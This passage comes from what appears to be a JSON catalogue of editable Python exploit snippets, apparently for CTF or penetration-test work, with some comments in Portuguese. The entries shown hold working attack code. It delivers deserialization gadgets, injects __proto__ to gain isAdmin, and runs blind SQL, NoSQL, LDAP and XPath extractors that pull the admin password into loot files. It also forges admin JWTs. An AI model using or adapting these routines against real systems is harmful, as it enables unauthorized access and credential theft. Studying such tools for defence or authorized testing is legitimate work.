PARAM_MODE == \"file\":\n        r = session.post(url(cfg, PATH), files={\"file\": (\"payload.bin\", blob, CONTENT_TYPE)}, timeout=cfg.timeout)\n    elif PARAM_MODE == \"form_b64\":\n        r = session.post(url(cfg, PATH), data={\"payload\": base64.b64encode(blob).decode()}, timeout=cfg.timeout)\n    else:\n        fail(\"bad PARAM_MODE\")\n    debug(cfg, \"deser\", r.status_code, r.text[:300])\n    return r\n"},{"id":"deser-external-payload-delivery","title":"Deser - external payload delivery","category":"Deser","kind":"function","functionName":"deliver_external_deser_payload","call":"r = deliver_external_deser_payload(session, cfg)","summary":"Builds or reads a serialized payload and delivers it as body, form, JSON, file, cookie, or header.","useWhen":"Payload comes from serialize.php, phpggc, ysoserial, node/java helper, or a binary file and the sink is not Java-only.","editFirst":["BUILD_CMD","PAYLOAD_FILE","DELIVERY_MODE","DELIVERY_PATH","PARAM_NAME","TRIGGER_PATH"],"aliases":["serialize.php","ysoserial","phpggc","external payload","DELIVERY_MODE","PARAM_NAME","form serialized","cookie payload","header payload"],"code":"def deliver_external_deser_payload(session, cfg):\n    import subprocess\n    from urllib.parse import quote_from_bytes\n\n    # Use when: source review shows unserialize/readObject/etc and payload is generated by another tool.\n    BUILD_CMD = [\"php\", \"serialize.php\"]  # EDIT [] to read PAYLOAD_FILE instead\n    PAYLOAD_FILE = \"\"                     # EDIT e.g. payload.bin when BUILD_CMD=[]\n    BUILD_TIMEOUT = 60\n    PAYLOAD_ENCODING = \"raw\"              # EDIT raw | base64 | url | hex\n\n    DELIVERY_METHOD = \"POST\"              # EDIT POST | GET\n    DELIVERY_PATH = \"/api/import\"         # EDIT vulnerable endpoint\n    DELIVERY_MODE = \"form\"                # EDIT body | form | json | file | cookie | header\n    PARAM_NAME = \"payload\"                # EDIT field/cookie/header/file param name\n    CONTENT_TYPE = \"application/octet-stream\"  # EDIT\n    EXTRA_DATA = {}                       # EDIT extra form/query/json fields\n\n    TRIGGER_PATH = \"\"                     # EDIT optional second request that triggers gadget\n    TRIGGER_METHOD = \"GET\"                # EDIT GET | POST\n\n    if BUILD_CMD:\n        print(\"[*] building payload:\", \" \".join(BUILD_CMD))\n        built = subprocess.run(BUILD_CMD, capture_output=True, timeout=BUILD_TIMEOUT)\n        if built.returncode != 0:\n            print(built.stderr.decode(errors=\"replace\")[:1000])\n            fail(\"payload builder failed\")\n        blob = built.stdout\n    elif PAYLOAD_FILE:\n        blob = open(PAYLOAD_FILE, \"rb\").read()\n    else:\n        blob = b\"PAYLOAD\"                 # EDIT fallback/manual bytes\n\n    if PAYLOAD_ENCODING == \"base64\":\n        value = base64.b64encode(blob).decode()\n    elif PAYLOAD_ENCODING == \"url\":\n        value = quote_from_bytes(blob)\n    elif PAYLOAD_ENCODING == \"hex\":\n        value = blob.hex()\n    elif PAYLOAD_ENCODING == \"raw\":\n        value = blob\n    else:\n        fail(\"bad PAYLOAD_ENCODING\")\n\n    headers = {}\n    kwargs = {\"timeout\": cfg.timeout}\n    method = DELIVERY_METHOD.upper()\n\n    if DELIVERY_MODE == \"body\":\n        headers[\"Content-Type\"] = CONTENT_TYPE\n        kwargs[\"data\"] = value\n    elif DELIVERY_MODE == \"form\":\n        data = dict(EXTRA_DATA)\n        data[PARAM_NAME] = value if isinstance(value, str) else value.decode(\"latin-1\")\n        kwargs[\"data\"] = data\n    elif DELIVERY_MODE == \"json\":\n        data = dict(EXTRA_DATA)\n        data[PARAM_NAME] = value if isinstance(value, str) else value.decode(\"latin-1\")\n        kwargs[\"json\"] = data\n    elif DELIVERY_MODE == \"file\":\n        kwargs[\"data\"] = EXTRA_DATA\n        kwargs[\"files\"] = {PARAM_NAME: (\"payload.bin\", blob, CONTENT_TYPE)}\n    elif DELIVERY_MODE == \"cookie\":\n        headers[\"Cookie\"] = f\"{PARAM_NAME}={value if isinstance(value, str) else value.hex()}\"\n        kwargs[\"data\"] = EXTRA_DATA if method != \"GET\" else None\n        kwargs[\"params\"] = EXTRA_DATA if method == \"GET\" else None\n    elif DELIVERY_MODE == \"header\":\n        headers[PARAM_NAME] = value if isinstance(value, str) else value.hex()\n        kwargs[\"data\"] = EXTRA_DATA if method != \"GET\" else None\n        kwargs[\"params\"] = EXTRA_DATA if method == \"GET\" else None\n    else:\n        fail(\"bad DELIVERY_MODE\")\n\n    if headers:\n        kwargs[\"headers\"] = headers\n\n    r = session.request(method, url(cfg, DELIVERY_PATH), **kwargs)\n    print(\"[+] delivered payload\", r.status_code, \"len\", len(r.text))\n\n    if TRIGGER_PATH:\n        try:\n            if TRIGGER_METHOD.upper() == \"POST\":\n                t = session.post(url(cfg, TRIGGER_PATH), timeout=cfg.timeout)\n            else:\n                t = session.get(url(cfg, TRIGGER_PATH), timeout=cfg.timeout)\n            print(\"[+] trigger\", t.status_code, \"len\", len(t.text))\n        except requests.exceptions.ReadTimeout:\n            print(\"[+] trigger timed out; callback may be connected\")\n    return r\n"},{"id":"prototype-pollution-json","title":"Node - prototype pollution JSON","category":"Node","kind":"function","functionName":"prototype_pollution_json","call":"prototype_pollution_json(session, cfg)","summary":"Envia JSON __proto__/constructor para testar pollution.","useWhen":"Source usa merge/defaultsDeep/set/Object.assign com input JSON.","editFirst":["PATH","PAYLOADS","CHECK_PATH"],"aliases":["__proto__","constructor.prototype","lodash merge","Object.assign","prototype pollution"],"code":"def prototype_pollution_json(session, cfg):\n    PATH = \"/api/settings\"                 # EDIT\n    CHECK_PATH = \"/api/me\"                 # EDIT\n    PAYLOADS = [\n        {\"__proto__\": {\"isAdmin\": True}},\n        {\"constructor\": {\"prototype\": {\"isAdmin\": True}}},\n    ]\n    for payload in PAYLOADS:\n        r = session.post(url(cfg, PATH), json=payload, timeout=cfg.timeout)\n        debug(cfg, \"pollute\", r.status_code, payload, r.text[:150])\n        c = session.get(url(cfg, CHECK_PATH), timeout=cfg.timeout)\n        print(\"[check]\", c.status_code, c.text[:300])\n    return True\n"},{"id":"websocket-json-send","title":"WebSocket - JSON send/receive","category":"WebSocket","kind":"function","functionName":"websocket_json_send","call":"raw = websocket_json_send(cfg, {'action': 'ping'})","summary":"Envia mensagem JSON por WebSocket puro e devolve resposta.","useWhen":"Burp mostra ws:// ou wss:// normal, nao Socket.IO.","editFirst":["WS_PATH_OR_URL","HEADERS","COOKIES","ORIGIN"],"aliases":["websocket-client","ws://","wss://","send","recv","JSON"],"code":"def websocket_json_send(cfg, message):\n    WS_PATH_OR_URL = \"/ws\"                 # EDIT path or full ws://host/ws\n    HEADERS = {}                           # EDIT {\"Authorization\": \"Bearer ...\"}\n    COOKIES = {}                           # EDIT {\"session\": \"...\"}\n    ORIGIN = None                          # EDIT e.g. cfg.target\n\n    try:\n        import websocket\n    except ImportError:\n        fail(\"install websocket-client: pip install websocket-client\")\n\n    if WS_PATH_OR_URL.startswith((\"ws://\", \"wss://\")):\n        ws_url = WS_PATH_OR_URL\n    else:\n        scheme = \"wss\" if cfg.target.startswith(\"https://\") else \"ws\"\n        host = cfg.target.split(\"://\", 1)[1].rstrip(\"/\")\n        ws_url = f\"{scheme}://{host}/{WS_PATH_OR_URL.lstrip('/')}\"\n\n    header_lines = [f\"{k}: {v}\" for k, v in HEADERS.items()]\n    if COOKIES:\n        header_lines.append(\"Cookie: \" + \"; \".join(f\"{k}={v}\" for k, v in COOKIES.items()))\n    ws = websocket.create_connection(ws_url, header=header_lines, origin=ORIGIN, timeout=cfg.timeout)\n    ws.send(json.dumps(message))\n    raw = ws.recv()\n    ws.close()\n    debug(cfg, \"websocket recv\", raw[:300])\n    return raw\n"},{"id":"boolean-sqli-websocket","title":"SQLi - boolean extractor WebSocket","category":"SQLi","kind":"function","functionName":"dump_boolean_sqli_websocket","call":"dump_boolean_sqli_websocket(cfg)","summary":"Boolean SQLi extractor quando o sink esta numa mensagem WebSocket pura.","useWhen":"Mensagem WS tem campo vulneravel e resposta contem marker true/false.","editFirst":["EVENT_FIELD","MESSAGE_TEMPLATE","TRUE_MARKER","LENGTH_EXPR","CHAR_EXPR"],"aliases":["WebSocket SQLi","blind","boolean","websocket-client","ASCII","SUBSTRING"],"code":"def dump_boolean_sqli_websocket(cfg):\n    EVENT_FIELD = \"email\"                  # EDIT vulnerable field\n    MESSAGE_TEMPLATE = {\"action\": \"check\", \"email\": \"__PAYLOAD__\"}  # EDIT\n    TRUE_MARKER = \"exists\"                 # EDIT\n    INJECTION = \"test' AND ({q})-- -\"       # EDIT\n    LENGTH_EXPR = \"LENGTH((SELECT password FROM users WHERE username='admin'))={n}\"  # EDIT\n    CHAR_EXPR = \"ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),{i},1)) BETWEEN {lo} AND {mid}\"  # EDIT\n    MAX_LEN = 80\n\n    def oracle(q):\n        msg = dict(MESSAGE_TEMPLATE)\n        msg[EVENT_FIELD] = INJECTION.format(q=q)\n        raw = websocket_json_send(cfg, msg)\n        debug(cfg, \"ws oracle\", q, raw[:160])\n        return TRUE_MARKER in raw\n\n    length = next((n for n in range(1, MAX_LEN + 1) if oracle(LENGTH_EXPR.format(n=n))), 0)\n    check(length, \"length not found\")\n    out = \"\"\n    for i in range(1, length + 1):\n        lo, hi = 32, 126\n        while lo <= hi:\n            mid = (lo + hi) // 2\n            if oracle(CHAR_EXPR.format(i=i, lo=lo, mid=mid)):\n                hi = mid - 1\n            else:\n                lo = mid + 1\n        out += chr(lo)\n        print(\"[partial]\", out)\n    return save_loot(\"websocket_boolean_sqli.txt\", out)\n"},{"id":"nosql-regex-prefix-dump","title":"NoSQL - regex prefix dump","category":"NoSQL/LDAP/XPath","kind":"function","functionName":"dump_nosql_regex_prefix","call":"dump_nosql_regex_prefix(session, cfg)","summary":"Extrai valor com regex prefix oracle, comum em Mongo-style filters.","useWhen":"Input JSON aceita `$regex`, `$ne`, `$where`, ou operador parecido.","editFirst":["PATH","JSON_TEMPLATE","FIELD_PATH","TRUE_MARKER","ALPHABET"],"aliases":["NoSQL","$regex","$ne","$where","Mongo","prefix","password"],"code":"def dump_nosql_regex_prefix(session, cfg):\n    PATH = \"/api/login\"                    # EDIT\n    JSON_TEMPLATE = {\"username\": \"admin\", \"password\": {\"$regex\": \"^__PREFIX__\"}}  # EDIT\n    TRUE_MARKER = \"Welcome\"                # EDIT\n    ALPHABET = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.@{}\"  # EDIT\n    MAX_LEN = 80\n\n    def set_prefix(obj, prefix):\n        text = json.dumps(obj).replace(\"__PREFIX__\", re.escape(prefix))\n        return json.loads(text)\n\n    out = \"\"\n    for _ in range(MAX_LEN):\n        found = False\n        for ch in ALPHABET:\n            body = set_prefix(JSON_TEMPLATE, out + ch)\n            r = session.post(url(cfg, PATH), json=body, timeout=cfg.timeout)\n            debug(cfg, \"nosql\", out + ch, r.status_code, r.text[:80])\n            if TRUE_MARKER in r.text:\n                out += ch\n                print(\"[partial]\", out)\n                found = True\n                break\n        if not found:\n            break\n    check(out, \"nothing extracted\")\n    return save_loot(\"nosql_prefix.txt\", out)\n"},{"id":"ldap-prefix-dump","title":"LDAP - prefix oracle dump","category":"NoSQL/LDAP/XPath","kind":"function","functionName":"dump_ldap_prefix","call":"dump_ldap_prefix(session, cfg)","summary":"Extrai atributo LDAP com wildcard prefix.","useWhen":"Filtro LDAP concatena input e aceita `*`, `)(`, ou filtros compostos.","editFirst":["PATH","PARAM","INJECTION","TRUE_MARKER","ALPHABET"],"aliases":["LDAP","uid","mail","wildcard","prefix","*)("],"code":"def dump_ldap_prefix(session, cfg):\n    PATH = \"/search\"                       # EDIT\n    PARAM = \"q\"                            # EDIT\n    TRUE_MARKER = \"found\"                  # EDIT\n    INJECTION = \"admin*)(password={prefix}*\"  # EDIT target filter shape\n    ALPHABET = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.@{}\"  # EDIT\n    MAX_LEN = 80\n\n    out = \"\"\n    for _ in range(MAX_LEN):\n        found = False\n        for ch in ALPHABET:\n            payload = INJECTION.format(prefix=out + ch)\n            r = session.get(url(cfg, PATH), params={PARAM: payload}, timeout=cfg.timeout)\n            debug(cfg, \"ldap\", out + ch, r.status_code, r.text[:100])\n            if TRUE_MARKER in r.text:\n                out += ch\n                print(\"[partial]\", out)\n                found = True\n                break\n        if not found:\n            break\n    check(out, \"nothing extracted\")\n    return save_loot(\"ldap_prefix.txt\", out)\n"},{"id":"xpath-boolean-dump","title":"XPath - boolean extractor","category":"NoSQL/LDAP/XPath","kind":"function","functionName":"dump_xpath_boolean","call":"dump_xpath_boolean(session, cfg)","summary":"XPath blind extractor with string-length/substring oracle.","useWhen":"Source builds XPath with user input and response differs true/false.","editFirst":["PATH","PARAM","TRUE_MARKER","LENGTH_EXPR","CHAR_EXPR"],"aliases":["XPath","substring","string-length","boolean","XML"],"code":"def dump_xpath_boolean(session, cfg):\n    PATH = \"/login\"                        # EDIT\n    PARAM = \"username\"                     # EDIT\n    TRUE_MARKER = \"Welcome\"                # EDIT\n    INJECTION = \"admin' and ({q}) and '1'='1\"  # EDIT\n    LENGTH_EXPR = \"string-length(/users/user[role='admin']/password)={n}\"  # EDIT\n    CHAR_EXPR = \"substring(/users/user[role='admin']/password,{i},1)='{ch}'\"  # EDIT\n    ALPHABET = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.@{}\"  # EDIT\n    MAX_LEN = 80\n\n    def oracle(q):\n        r = session.post(url(cfg, PATH), data={PARAM: INJECTION.format(q=q)}, timeout=cfg.timeout)\n        debug(cfg, \"xpath\", q, r.status_code, r.text[:90])\n        return TRUE_MARKER in r.text\n\n    length = next((n for n in range(1, MAX_LEN + 1) if oracle(LENGTH_EXPR.format(n=n))), 0)\n    check(length, \"length not found\")\n    out = \"\"\n    for i in range(1, length + 1):\n        for ch in ALPHABET:\n            if oracle(CHAR_EXPR.format(i=i, ch=ch)):\n                out += ch\n                print(\"[partial]\", out)\n                break\n    return save_loot(\"xpath_dump.txt\", out)\n"},{"id":"jwt-hs-forge","title":"Token - JWT HMAC forge","category":"Token","kind":"function","functionName":"forge_jwt_hs256","call":"token = forge_jwt_hs256()","summary":"Forge JWT HS256/HS384/HS512 with editable header/payload/secret.","useWhen":"Source leaks JWT secret or uses weak/default HMAC key.","editFirst":["ALG","SECRET","HEADER","PAYLOAD"],"aliases":["JWT","HS256","HMAC","secret","admin","role"],"code":"def forge_jwt_hs256():\n    import hashlib\n    import hmac\n    ALG = \"HS256\"                           # EDIT HS256/HS384/HS512\n    SECRET = b\"CHANGE_ME_SECRET\"            # EDIT\n    HEADER = {\"typ\": \"JWT\", \"alg\": ALG}     # EDIT\n    PAYLOAD = {\"sub\": \"1\", \"role\": \"admin\"} # EDIT\n    DIGEST = {\"HS256\": hashlib.sha256, \"HS384\": hashlib.sha384, \
